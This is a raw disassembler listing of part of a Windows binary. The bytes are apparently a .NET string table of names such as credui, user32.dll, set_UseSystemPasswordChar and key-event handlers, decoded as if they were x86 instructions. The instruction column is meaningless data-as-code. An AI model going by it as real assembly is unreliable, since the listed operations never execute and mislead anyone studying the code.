  408783:	70 46                	jo     0x4087cb
  408785:	6f                   	outsl  %ds:(%esi),(%dx)
  408786:	72 44                	jb     0x4087cc
  408788:	75 6d                	jne    0x4087f7
  40878a:	62 61 73             	bound  %esp,0x73(%ecx)
  40878d:	73 65                	jae    0x4087f4
  40878f:	73 00                	jae    0x408791
  408791:	44                   	inc    %esp
  408792:	6c                   	insb   (%dx),%es:(%edi)
  408793:	6c                   	insb   (%dx),%es:(%edi)
  408794:	49                   	dec    %ecx
  408795:	6d                   	insl   (%dx),%es:(%edi)
  408796:	70 6f                	jo     0x408807
  408798:	72 74                	jb     0x40880e
  40879a:	41                   	inc    %ecx
  40879b:	74 74                	je     0x408811
  40879d:	72 69                	jb     0x408808
  40879f:	62 75 74             	bound  %esi,0x74(%ebp)
  4087a2:	65 00 63 72          	add    %ah,%gs:0x72(%ebx)
  4087a6:	65 64 75 69          	gs fs jne 0x408813
  4087aa:	00 53 74             	add    %dl,0x74(%ebx)
  4087ad:	72 69                	jb     0x408818
  4087af:	6e                   	outsb  %ds:(%esi),(%dx)
  4087b0:	67 00 49 73          	add    %cl,0x73(%bx,%di)
  4087b4:	4e                   	dec    %esi
  4087b5:	75 6c                	jne    0x408823
  4087b7:	6c                   	insb   (%dx),%es:(%edi)
  4087b8:	4f                   	dec    %edi
  4087b9:	72 45                	jb     0x408800
  4087bb:	6d                   	insl   (%dx),%es:(%edi)
  4087bc:	70 74                	jo     0x408832
  4087be:	79 00                	jns    0x4087c0
  4087c0:	4d                   	dec    %ebp
  4087c1:	61                   	popa
  4087c2:	72 73                	jb     0x408837
  4087c4:	68 61 6c 00 53       	push   $0x53006c61
  4087c9:	69 7a 65 4f 66 00 49 	imul   $0x4900664f,0x65(%edx),%edi
  4087d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4087d1:	74 50                	je     0x408823
  4087d3:	74 72                	je     0x408847
  4087d5:	00 5a 65             	add    %bl,0x65(%edx)
  4087d8:	72 6f                	jb     0x408849
  4087da:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  4087de:	74 72                	je     0x408852
  4087e0:	69 6e 67 00 53 74 72 	imul   $0x72745300,0x67(%esi),%ebp
  4087e7:	75 63                	jne    0x40884c
  4087e9:	74 4c                	je     0x408837
  4087eb:	61                   	popa
  4087ec:	79 6f                	jns    0x40885d
  4087ee:	75 74                	jne    0x408864
  4087f0:	41                   	inc    %ecx
  4087f1:	74 74                	je     0x408867
  4087f3:	72 69                	jb     0x40885e
  4087f5:	62 75 74             	bound  %esi,0x74(%ebp)
  4087f8:	65 00 4c 61 79       	add    %cl,%gs:0x79(%ecx,%eiz,2)
  4087fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4087fe:	75 74                	jne    0x408874
  408800:	4b                   	dec    %ebx
  408801:	69 6e 64 00 46 6c 61 	imul   $0x616c4600,0x64(%esi),%ebp
  408808:	67 73 41             	addr16 jae 0x40884c
  40880b:	74 74                	je     0x408881
  40880d:	72 69                	jb     0x408878
  40880f:	62 75 74             	bound  %esi,0x74(%ebp)
  408812:	65 00 45 6d          	add    %al,%gs:0x6d(%ebp)
  408816:	70 74                	jo     0x40888c
  408818:	79 00                	jns    0x40881a
  40881a:	43                   	inc    %ebx
  40881b:	6c                   	insb   (%dx),%es:(%edi)
  40881c:	6f                   	outsl  %ds:(%esi),(%dx)
  40881d:	73 65                	jae    0x408884
  40881f:	00 73 65             	add    %dh,0x65(%ebx)
  408822:	74 5f                	je     0x408883
  408824:	4f                   	dec    %edi
  408825:	70 61                	jo     0x408888
  408827:	63 69 74             	arpl   %ebp,0x74(%ecx)
  40882a:	79 00                	jns    0x40882c
  40882c:	73 65                	jae    0x408893
  40882e:	74 5f                	je     0x40888f
  408830:	53                   	push   %ebx
  408831:	68 6f 77 49 6e       	push   $0x6e49776f
  408836:	54                   	push   %esp
  408837:	61                   	popa
  408838:	73 6b                	jae    0x4088a5
  40883a:	62 61 72             	bound  %esp,0x72(%ecx)
  40883d:	00 43 6f             	add    %al,0x6f(%ebx)
  408840:	6e                   	outsb  %ds:(%esi),(%dx)
  408841:	74 72                	je     0x4088b5
  408843:	6f                   	outsl  %ds:(%esi),(%dx)
  408844:	6c                   	insb   (%dx),%es:(%edi)
  408845:	00 73 65             	add    %dh,0x65(%ebx)
  408848:	74 5f                	je     0x4088a9
  40884a:	56                   	push   %esi
  40884b:	69 73 69 62 6c 65 00 	imul   $0x656c62,0x69(%ebx),%esi
  408852:	67 65 74 5f          	addr16 gs je 0x4088b5
  408856:	42                   	inc    %edx
  408857:	6f                   	outsl  %ds:(%esi),(%dx)
  408858:	74 74                	je     0x4088ce
  40885a:	6f                   	outsl  %ds:(%esi),(%dx)
  40885b:	6d                   	insl   (%dx),%es:(%edi)
  40885c:	00 67 65             	add    %ah,0x65(%edi)
  40885f:	74 5f                	je     0x4088c0
  408861:	54                   	push   %esp
  408862:	6f                   	outsl  %ds:(%esi),(%dx)
  408863:	70 00                	jo     0x408865
  408865:	67 65 74 5f          	addr16 gs je 0x4088c8
  408869:	52                   	push   %edx
  40886a:	69 67 68 74 00 67 65 	imul   $0x65670074,0x68(%edi),%esp
  408871:	74 5f                	je     0x4088d2
  408873:	4c                   	dec    %esp
  408874:	65 66 74 00          	gs data16 je 0x408878
  408878:	41                   	inc    %ecx
  408879:	64 64 72 65          	fs fs jb 0x4088e2
  40887d:	73 73                	jae    0x4088f2
  40887f:	00 42 75             	add    %al,0x75(%edx)
  408882:	66 66 65 72 43       	data16 data16 gs jb 0x4088ca
  408887:	65 6c                	gs insb (%dx),%es:(%edi)
  408889:	6c                   	insb   (%dx),%es:(%edi)
  40888a:	54                   	push   %esp
  40888b:	79 70                	jns    0x4088fd
  40888d:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408891:	74 5f                	je     0x4088f2
  408893:	58                   	pop    %eax
  408894:	00 73 65             	add    %dh,0x65(%ebx)
  408897:	74 5f                	je     0x4088f8
  408899:	59                   	pop    %ecx
  40889a:	00 73 65             	add    %dh,0x65(%ebx)
  40889d:	74 5f                	je     0x4088fe
  40889f:	48                   	dec    %eax
  4088a0:	65 69 67 68 74 00 73 	imul   $0x65730074,%gs:0x68(%edi),%esp
  4088a7:	65 
  4088a8:	74 5f                	je     0x408909
  4088aa:	57                   	push   %edi
  4088ab:	69 64 74 68 00 41 70 	imul   $0x70704100,0x68(%esp,%esi,2),%esp
  4088b2:	70 
  4088b3:	44                   	inc    %esp
  4088b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4088b5:	6d                   	insl   (%dx),%es:(%edi)
  4088b6:	61                   	popa
  4088b7:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088be:	43                   	inc    %ebx
  4088bf:	75 72                	jne    0x408933
  4088c1:	72 65                	jb     0x408928
  4088c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4088c4:	74 44                	je     0x40890a
  4088c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4088c7:	6d                   	insl   (%dx),%es:(%edi)
  4088c8:	61                   	popa
  4088c9:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088d0:	46                   	inc    %esi
  4088d1:	72 69                	jb     0x40893c
  4088d3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4088d5:	64 6c                	fs insb (%dx),%es:(%edi)
  4088d7:	79 4e                	jns    0x408927
  4088d9:	61                   	popa
  4088da:	6d                   	insl   (%dx),%es:(%edi)
  4088db:	65 00 75 73          	add    %dh,%gs:0x73(%ebp)
  4088df:	65 72 33             	gs jb  0x408915
  4088e2:	32 2e                	xor    (%esi),%ch
  4088e4:	64 6c                	fs insb (%dx),%es:(%edi)
  4088e6:	6c                   	insb   (%dx),%es:(%edi)
  4088e7:	00 53 69             	add    %dl,0x69(%ebx)
  4088ea:	7a 65                	jp     0x408951
  4088ec:	46                   	inc    %esi
  4088ed:	00 43 6f             	add    %al,0x6f(%ebx)
  4088f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4088f1:	74 61                	je     0x408954
  4088f3:	69 6e 65 72 43 6f 6e 	imul   $0x6e6f4372,0x65(%esi),%ebp
  4088fa:	74 72                	je     0x40896e
  4088fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4088fd:	6c                   	insb   (%dx),%es:(%edi)
  4088fe:	00 73 65             	add    %dh,0x65(%ebx)
  408901:	74 5f                	je     0x408962
  408903:	41                   	inc    %ecx
  408904:	75 74                	jne    0x40897a
  408906:	6f                   	outsl  %ds:(%esi),(%dx)
  408907:	53                   	push   %ebx
  408908:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  40890b:	65 44                	gs inc %esp
  40890d:	69 6d 65 6e 73 69 6f 	imul   $0x6f69736e,0x65(%ebp),%ebp
  408914:	6e                   	outsb  %ds:(%esi),(%dx)
  408915:	73 00                	jae    0x408917
  408917:	41                   	inc    %ecx
  408918:	75 74                	jne    0x40898e
  40891a:	6f                   	outsl  %ds:(%esi),(%dx)
  40891b:	53                   	push   %ebx
  40891c:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  40891f:	65 4d                	gs dec %ebp
  408921:	6f                   	outsl  %ds:(%esi),(%dx)
  408922:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  408927:	74 5f                	je     0x408988
  408929:	41                   	inc    %ecx
  40892a:	75 74                	jne    0x4089a0
  40892c:	6f                   	outsl  %ds:(%esi),(%dx)
  40892d:	53                   	push   %ebx
  40892e:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408931:	65 4d                	gs dec %ebp
  408933:	6f                   	outsl  %ds:(%esi),(%dx)
  408934:	64 65 00 54 65 78    	fs add %dl,%gs:0x78(%ebp,%eiz,2)
  40893a:	74 42                	je     0x40897e
  40893c:	6f                   	outsl  %ds:(%esi),(%dx)
  40893d:	78 00                	js     0x40893f
  40893f:	42                   	inc    %edx
  408940:	75 74                	jne    0x4089b6
  408942:	74 6f                	je     0x4089b3
  408944:	6e                   	outsb  %ds:(%esi),(%dx)
  408945:	00 73 65             	add    %dh,0x65(%ebx)
  408948:	74 5f                	je     0x4089a9
  40894a:	54                   	push   %esp
  40894b:	65 78 74             	gs js  0x4089c2
  40894e:	00 50 6f             	add    %dl,0x6f(%eax)
  408951:	69 6e 74 00 73 65 74 	imul   $0x74657300,0x74(%esi),%ebp
  408958:	5f                   	pop    %edi
  408959:	4c                   	dec    %esp
  40895a:	6f                   	outsl  %ds:(%esi),(%dx)
  40895b:	63 61 74             	arpl   %esp,0x74(%ecx)
  40895e:	69 6f 6e 00 53 63 72 	imul   $0x72635300,0x6e(%edi),%ebp
  408965:	65 65 6e             	gs outsb %gs:(%esi),(%dx)
  408968:	00 46 72             	add    %al,0x72(%esi)
  40896b:	6f                   	outsl  %ds:(%esi),(%dx)
  40896c:	6d                   	insl   (%dx),%es:(%edi)
  40896d:	43                   	inc    %ebx
  40896e:	6f                   	outsl  %ds:(%esi),(%dx)
  40896f:	6e                   	outsb  %ds:(%esi),(%dx)
  408970:	74 72                	je     0x4089e4
  408972:	6f                   	outsl  %ds:(%esi),(%dx)
  408973:	6c                   	insb   (%dx),%es:(%edi)
  408974:	00 67 65             	add    %ah,0x65(%edi)
  408977:	74 5f                	je     0x4089d8
  408979:	42                   	inc    %edx
  40897a:	6f                   	outsl  %ds:(%esi),(%dx)
  40897b:	75 6e                	jne    0x4089eb
  40897d:	64 73 00             	fs jae 0x408980
  408980:	67 65 74 5f          	addr16 gs je 0x4089e3
  408984:	57                   	push   %edi
  408985:	69 64 74 68 00 73 65 	imul   $0x74657300,0x68(%esp,%esi,2),%esp
  40898c:	74 
  40898d:	5f                   	pop    %edi
  40898e:	4d                   	dec    %ebp
  40898f:	61                   	popa
  408990:	78 69                	js     0x4089fb
  408992:	6d                   	insl   (%dx),%es:(%edi)
  408993:	75 6d                	jne    0x408a02
  408995:	53                   	push   %ebx
  408996:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40899d:	5f                   	pop    %edi
  40899e:	41                   	inc    %ecx
  40899f:	75 74                	jne    0x408a15
  4089a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4089a2:	53                   	push   %ebx
  4089a3:	69 7a 65 00 43 6f 6e 	imul   $0x6e6f4300,0x65(%edx),%edi
  4089aa:	74 72                	je     0x408a1e
  4089ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ad:	6c                   	insb   (%dx),%es:(%edi)
  4089ae:	43                   	inc    %ebx
  4089af:	6f                   	outsl  %ds:(%esi),(%dx)
  4089b0:	6c                   	insb   (%dx),%es:(%edi)
  4089b1:	6c                   	insb   (%dx),%es:(%edi)
  4089b2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b8:	00 67 65             	add    %ah,0x65(%edi)
  4089bb:	74 5f                	je     0x408a1c
  4089bd:	43                   	inc    %ebx
  4089be:	6f                   	outsl  %ds:(%esi),(%dx)
  4089bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c0:	74 72                	je     0x408a34
  4089c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4089c3:	6c                   	insb   (%dx),%es:(%edi)
  4089c4:	73 00                	jae    0x4089c6
  4089c6:	41                   	inc    %ecx
  4089c7:	64 64 00 73 65       	fs add %dh,%fs:0x65(%ebx)
  4089cc:	74 5f                	je     0x408a2d
  4089ce:	55                   	push   %ebp
  4089cf:	73 65                	jae    0x408a36
  4089d1:	53                   	push   %ebx
  4089d2:	79 73                	jns    0x408a47
  4089d4:	74 65                	je     0x408a3b
  4089d6:	6d                   	insl   (%dx),%es:(%edi)
  4089d7:	50                   	push   %eax
  4089d8:	61                   	popa
  4089d9:	73 73                	jae    0x408a4e
  4089db:	77 6f                	ja     0x408a4c
  4089dd:	72 64                	jb     0x408a43
  4089df:	43                   	inc    %ebx
  4089e0:	68 61 72 00 53       	push   $0x53007261
  4089e5:	65 74 42             	gs je  0x408a2a
  4089e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4089e9:	75 6e                	jne    0x408a59
  4089eb:	64 73 00             	fs jae 0x4089ee
  4089ee:	50                   	push   %eax
  4089ef:	74 72                	je     0x408a63
  4089f1:	54                   	push   %esp
  4089f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4089f3:	53                   	push   %ebx
  4089f4:	74 72                	je     0x408a68
  4089f6:	69 6e 67 55 6e 69 00 	imul   $0x696e55,0x67(%esi),%ebp
  4089fd:	73 65                	jae    0x408a64
  4089ff:	74 5f                	je     0x408a60
  408a01:	44                   	inc    %esp
  408a02:	69 61 6c 6f 67 52 65 	imul   $0x6552676f,0x6c(%ecx),%esp
  408a09:	73 75                	jae    0x408a80
  408a0b:	6c                   	insb   (%dx),%es:(%edi)
  408a0c:	74 00                	je     0x408a0e
  408a0e:	4d                   	dec    %ebp
  408a0f:	61                   	popa
  408a10:	74 68                	je     0x408a7a
  408a12:	00 4d 61             	add    %cl,0x61(%ebp)
  408a15:	78 00                	js     0x408a17
  408a17:	73 65                	jae    0x408a7e
  408a19:	74 5f                	je     0x408a7a
  408a1b:	43                   	inc    %ebx
  408a1c:	6c                   	insb   (%dx),%es:(%edi)
  408a1d:	69 65 6e 74 53 69 7a 	imul   $0x7a695374,0x6e(%ebp),%esp
  408a24:	65 00 41 64          	add    %al,%gs:0x64(%ecx)
  408a28:	64 52                	fs push %edx
  408a2a:	61                   	popa
  408a2b:	6e                   	outsb  %ds:(%esi),(%dx)
  408a2c:	67 65 00 46 6f       	add    %al,%gs:0x6f(%bp)
  408a31:	72 6d                	jb     0x408aa0
  408a33:	42                   	inc    %edx
  408a34:	6f                   	outsl  %ds:(%esi),(%dx)
  408a35:	72 64                	jb     0x408a9b
  408a37:	65 72 53             	gs jb  0x408a8d
  408a3a:	74 79                	je     0x408ab5
  408a3c:	6c                   	insb   (%dx),%es:(%edi)
  408a3d:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408a41:	74 5f                	je     0x408aa2
  408a43:	46                   	inc    %esi
  408a44:	6f                   	outsl  %ds:(%esi),(%dx)
  408a45:	72 6d                	jb     0x408ab4
  408a47:	42                   	inc    %edx
  408a48:	6f                   	outsl  %ds:(%esi),(%dx)
  408a49:	72 64                	jb     0x408aaf
  408a4b:	65 72 53             	gs jb  0x408aa1
  408a4e:	74 79                	je     0x408ac9
  408a50:	6c                   	insb   (%dx),%es:(%edi)
  408a51:	65 00 46 6f          	add    %al,%gs:0x6f(%esi)
  408a55:	72 6d                	jb     0x408ac4
  408a57:	53                   	push   %ebx
  408a58:	74 61                	je     0x408abb
  408a5a:	72 74                	jb     0x408ad0
  408a5c:	50                   	push   %eax
  408a5d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a5e:	73 69                	jae    0x408ac9
  408a60:	74 69                	je     0x408acb
  408a62:	6f                   	outsl  %ds:(%esi),(%dx)
  408a63:	6e                   	outsb  %ds:(%esi),(%dx)
  408a64:	00 73 65             	add    %dh,0x65(%ebx)
  408a67:	74 5f                	je     0x408ac8
  408a69:	53                   	push   %ebx
  408a6a:	74 61                	je     0x408acd
  408a6c:	72 74                	jb     0x408ae2
  408a6e:	50                   	push   %eax
  408a6f:	6f                   	outsl  %ds:(%esi),(%dx)
  408a70:	73 69                	jae    0x408adb
  408a72:	74 69                	je     0x408add
  408a74:	6f                   	outsl  %ds:(%esi),(%dx)
  408a75:	6e                   	outsb  %ds:(%esi),(%dx)
  408a76:	00 41 73             	add    %al,0x73(%ecx)
  408a79:	73 65                	jae    0x408ae0
  408a7b:	6d                   	insl   (%dx),%es:(%edi)
  408a7c:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  408a80:	47                   	inc    %edi
  408a81:	65 74 45             	gs je  0x408ac9
  408a84:	78 65                	js     0x408aeb
  408a86:	63 75 74             	arpl   %esi,0x74(%ebp)
  408a89:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  408a90:	6d                   	insl   (%dx),%es:(%edi)
  408a91:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  408a95:	67 65 74 5f          	addr16 gs je 0x408af8
  408a99:	4c                   	dec    %esp
  408a9a:	6f                   	outsl  %ds:(%esi),(%dx)
  408a9b:	63 61 74             	arpl   %esp,0x74(%ecx)
  408a9e:	69 6f 6e 00 49 63 6f 	imul   $0x6f634900,0x6e(%edi),%ebp
  408aa5:	6e                   	outsb  %ds:(%esi),(%dx)
  408aa6:	00 45 78             	add    %al,0x78(%ebp)
  408aa9:	74 72                	je     0x408b1d
  408aab:	61                   	popa
  408aac:	63 74 41 73          	arpl   %esi,0x73(%ecx,%eax,2)
  408ab0:	73 6f                	jae    0x408b21
  408ab2:	63 69 61             	arpl   %ebp,0x61(%ecx)
  408ab5:	74 65                	je     0x408b1c
  408ab7:	64 49                	fs dec %ecx
  408ab9:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  408abc:	00 73 65             	add    %dh,0x65(%ebx)
  408abf:	74 5f                	je     0x408b20
  408ac1:	49                   	dec    %ecx
  408ac2:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  408ac5:	00 73 65             	add    %dh,0x65(%ebx)
  408ac8:	74 5f                	je     0x408b29
  408aca:	4d                   	dec    %ebp
  408acb:	69 6e 69 6d 69 7a 65 	imul   $0x657a696d,0x69(%esi),%ebp
  408ad2:	42                   	inc    %edx
  408ad3:	6f                   	outsl  %ds:(%esi),(%dx)
  408ad4:	78 00                	js     0x408ad6
  408ad6:	73 65                	jae    0x408b3d
  408ad8:	74 5f                	je     0x408b39
  408ada:	4d                   	dec    %ebp
  408adb:	61                   	popa
  408adc:	78 69                	js     0x408b47
  408ade:	6d                   	insl   (%dx),%es:(%edi)
  408adf:	69 7a 65 42 6f 78 00 	imul   $0x786f42,0x65(%edx),%edi
  408ae6:	49                   	dec    %ecx
  408ae7:	42                   	inc    %edx
  408ae8:	75 74                	jne    0x408b5e
  408aea:	74 6f                	je     0x408b5b
  408aec:	6e                   	outsb  %ds:(%esi),(%dx)
  408aed:	43                   	inc    %ebx
  408aee:	6f                   	outsl  %ds:(%esi),(%dx)
  408aef:	6e                   	outsb  %ds:(%esi),(%dx)
  408af0:	74 72                	je     0x408b64
  408af2:	6f                   	outsl  %ds:(%esi),(%dx)
  408af3:	6c                   	insb   (%dx),%es:(%edi)
  408af4:	00 73 65             	add    %dh,0x65(%ebx)
  408af7:	74 5f                	je     0x408b58
  408af9:	41                   	inc    %ecx
  408afa:	63 63 65             	arpl   %esp,0x65(%ebx)
  408afd:	70 74                	jo     0x408b73
  408aff:	42                   	inc    %edx
  408b00:	75 74                	jne    0x408b76
  408b02:	74 6f                	je     0x408b73
  408b04:	6e                   	outsb  %ds:(%esi),(%dx)
  408b05:	00 73 65             	add    %dh,0x65(%ebx)
  408b08:	74 5f                	je     0x408b69
  408b0a:	43                   	inc    %ebx
  408b0b:	61                   	popa
  408b0c:	6e                   	outsb  %ds:(%esi),(%dx)
  408b0d:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  408b10:	42                   	inc    %edx
  408b11:	75 74                	jne    0x408b87
  408b13:	74 6f                	je     0x408b84
  408b15:	6e                   	outsb  %ds:(%esi),(%dx)
  408b16:	00 53 68             	add    %dl,0x68(%ebx)
  408b19:	6f                   	outsl  %ds:(%esi),(%dx)
  408b1a:	77 44                	ja     0x408b60
  408b1c:	69 61 6c 6f 67 00 67 	imul   $0x6700676f,0x6c(%ecx),%esp
  408b23:	65 74 5f             	gs je  0x408b85
  408b26:	54                   	push   %esp
  408b27:	65 78 74             	gs js  0x408b9e
  408b2a:	00 67 65             	add    %ah,0x65(%edi)
  408b2d:	74 5f                	je     0x408b8e
  408b2f:	43                   	inc    %ebx
  408b30:	6f                   	outsl  %ds:(%esi),(%dx)
  408b31:	75 6e                	jne    0x408ba1
  408b33:	74 00                	je     0x408b35
  408b35:	52                   	push   %edx
  408b36:	61                   	popa
  408b37:	64 69 6f 42 75 74 74 	imul   $0x6f747475,%fs:0x42(%edi),%ebp
  408b3e:	6f 
  408b3f:	6e                   	outsb  %ds:(%esi),(%dx)
  408b40:	00 54 6f 6f          	add    %dl,0x6f(%edi,%ebp,2)
  408b44:	6c                   	insb   (%dx),%es:(%edi)
  408b45:	54                   	push   %esp
  408b46:	69 70 00 49 45 6e 75 	imul   $0x756e4549,0x0(%eax),%esi
  408b4d:	6d                   	insl   (%dx),%es:(%edi)
  408b4e:	65 72 61             	gs jb  0x408bb2
  408b51:	74 6f                	je     0x408bc2
  408b53:	72 60                	jb     0x408bb5
  408b55:	31 00                	xor    %eax,(%eax)
  408b57:	47                   	inc    %edi
  408b58:	65 74 45             	gs je  0x408ba0
  408b5b:	6e                   	outsb  %ds:(%esi),(%dx)
  408b5c:	75 6d                	jne    0x408bcb
  408b5e:	65 72 61             	gs jb  0x408bc2
  408b61:	74 6f                	je     0x408bd2
  408b63:	72 00                	jb     0x408b65
  408b65:	67 65 74 5f          	addr16 gs je 0x408bc8
  408b69:	43                   	inc    %ebx
  408b6a:	75 72                	jne    0x408bde
  408b6c:	72 65                	jb     0x408bd3
  408b6e:	6e                   	outsb  %ds:(%esi),(%dx)
  408b6f:	74 00                	je     0x408b71
  408b71:	67 65 74 5f          	addr16 gs je 0x408bd4
  408b75:	4c                   	dec    %esp
  408b76:	61                   	popa
  408b77:	62 65 6c             	bound  %esp,0x6c(%ebp)
  408b7a:	00 73 65             	add    %dh,0x65(%ebx)
  408b7d:	74 5f                	je     0x408bde
  408b7f:	43                   	inc    %ebx
  408b80:	68 65 63 6b 65       	push   $0x656b6365
  408b85:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  408b89:	74 5f                	je     0x408bea
  408b8b:	48                   	dec    %eax
  408b8c:	65 69 67 68 74 00 67 	imul   $0x65670074,%gs:0x68(%edi),%esp
  408b93:	65 
  408b94:	74 5f                	je     0x408bf5
  408b96:	48                   	dec    %eax
  408b97:	65 6c                	gs insb (%dx),%es:(%edi)
  408b99:	70 4d                	jo     0x408be8
  408b9b:	65 73 73             	gs jae 0x408c11
  408b9e:	61                   	popa
  408b9f:	67 65 00 53 65       	add    %dl,%gs:0x65(%bp,%di)
  408ba4:	74 54                	je     0x408bfa
  408ba6:	6f                   	outsl  %ds:(%esi),(%dx)
  408ba7:	6f                   	outsl  %ds:(%esi),(%dx)
  408ba8:	6c                   	insb   (%dx),%es:(%edi)
  408ba9:	54                   	push   %esp
  408baa:	69 70 00 53 79 73 74 	imul   $0x74737953,0x0(%eax),%esi
  408bb1:	65 6d                	gs insl (%dx),%es:(%edi)
  408bb3:	2e 43                	cs inc %ebx
  408bb5:	6f                   	outsl  %ds:(%esi),(%dx)
  408bb6:	6c                   	insb   (%dx),%es:(%edi)
  408bb7:	6c                   	insb   (%dx),%es:(%edi)
  408bb8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408bbd:	6e                   	outsb  %ds:(%esi),(%dx)
  408bbe:	73 00                	jae    0x408bc0
  408bc0:	49                   	dec    %ecx
  408bc1:	45                   	inc    %ebp
  408bc2:	6e                   	outsb  %ds:(%esi),(%dx)
  408bc3:	75 6d                	jne    0x408c32
  408bc5:	65 72 61             	gs jb  0x408c29
  408bc8:	74 6f                	je     0x408c39
  408bca:	72 00                	jb     0x408bcc
  408bcc:	4d                   	dec    %ebp
  408bcd:	6f                   	outsl  %ds:(%esi),(%dx)
  408bce:	76 65                	jbe    0x408c35
  408bd0:	4e                   	dec    %esi
  408bd1:	65 78 74             	gs js  0x408c48
  408bd4:	00 49 44             	add    %cl,0x44(%ecx)
  408bd7:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  408bde:	6c                   	insb   (%dx),%es:(%edi)
  408bdf:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  408be4:	70 6f                	jo     0x408c55
  408be6:	73 65                	jae    0x408c4d
  408be8:	00 73 65             	add    %dh,0x65(%ebx)
  408beb:	74 5f                	je     0x408c4c
  408bed:	53                   	push   %ebx
  408bee:	68 6f 77 41 6c       	push   $0x6c41776f
  408bf3:	77 61                	ja     0x408c56
  408bf5:	79 73                	jns    0x408c6a
  408bf7:	00 67 65             	add    %ah,0x65(%edi)
  408bfa:	74 5f                	je     0x408c5b
  408bfc:	43                   	inc    %ebx
  408bfd:	68 65 63 6b 65       	push   $0x656b6365
  408c02:	64 00 42 79          	add    %al,%fs:0x79(%edx)
  408c06:	74 65                	je     0x408c6d
  408c08:	00 4b 65             	add    %cl,0x65(%ebx)
  408c0b:	79 45                	jns    0x408c52
  408c0d:	76 65                	jbe    0x408c74
  408c0f:	6e                   	outsb  %ds:(%esi),(%dx)
  408c10:	74 48                	je     0x408c5a
  408c12:	61                   	popa
  408c13:	6e                   	outsb  %ds:(%esi),(%dx)
  408c14:	64 6c                	fs insb (%dx),%es:(%edi)
  408c16:	65 72 00             	gs jb  0x408c19
  408c19:	61                   	popa
  408c1a:	64 64 5f             	fs fs pop %edi
  408c1d:	4b                   	dec    %ebx
  408c1e:	65 79 44             	gs jns 0x408c65
  408c21:	6f                   	outsl  %ds:(%esi),(%dx)
  408c22:	77 6e                	ja     0x408c92
  408c24:	00 61 64             	add    %ah,0x64(%ecx)
  408c27:	64 5f                	fs pop %edi
  408c29:	4b                   	dec    %ebx
  408c2a:	65 79 55             	gs jns 0x408c82
  408c2d:	70 00                	jo     0x408c2f
  408c2f:	67 65 74 5f          	addr16 gs je 0x408c92
  408c33:	4b                   	dec    %ebx
  408c34:	65 79 56             	gs jns 0x408c8d
  408c37:	61                   	popa
  408c38:	6c                   	insb   (%dx),%es:(%edi)
  408c39:	75 65                	jne    0x408ca0
  408c3b:	00 73 65             	add    %dh,0x65(%ebx)
  408c3e:	74 5f                	je     0x408c9f
  408c40:	56                   	push   %esi
  408c41:	69 72 74 75 61 6c 4b 	imul   $0x4b6c6175,0x74(%edx),%esi
  408c48:	65 79 43             	gs jns 0x408c8e
  408c4b:	6f                   	outsl  %ds:(%esi),(%dx)
  408c4c:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  408c51:	74 5f                	je     0x408cb2
  408c53:	4b                   	dec    %ebx
  408c54:	65 79 43             	gs jns 0x408c9a
  408c57:	6f                   	outsl  %ds:(%esi),(%dx)
  408c58:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  408c5d:	74 5f                	je     0x408cbe
  408c5f:	53                   	push   %ebx
  408c60:	68 69 66 74 00       	push   $0x746669
  408c65:	67 65 74 5f          	addr16 gs je 0x408cc8
  408c69:	41                   	inc    %ecx
  408c6a:	6c                   	insb   (%dx),%es:(%edi)
  408c6b:	74 00                	je     0x408c6d
  408c6d:	67 65 74 5f          	addr16 gs je 0x408cd0
  408c71:	43                   	inc    %ebx
  408c72:	6f                   	outsl  %ds:(%esi),(%dx)
  408c73:	6e                   	outsb  %ds:(%esi),(%dx)
  408c74:	74 72                	je     0x408ce8
  408c76:	6f                   	outsl  %ds:(%esi),(%dx)
  408c77:	6c                   	insb   (%dx),%es:(%edi)
  408c78:	00 67 65             	add    %ah,0x65(%edi)
  408c7b:	74 5f                	je     0x408cdc
  408c7d:	43                   	inc    %ebx
  408c7e:	68 61 72 73 00       	push   $0x737261
  408c83:	73 65                	jae    0x408cea
  408c85:	74 5f                	je     0x408ce6
  408c87:	43                   	inc    %ebx
  408c88:	68 61 72 61 63       	push   $0x63617261
  408c8d:	74 65                	je     0x408cf4
  408c8f:	72 00                	jb     0x408c91
  408c91:	73 65                	jae    0x408cf8
  408c93:	74 5f                	je     0x408cf4
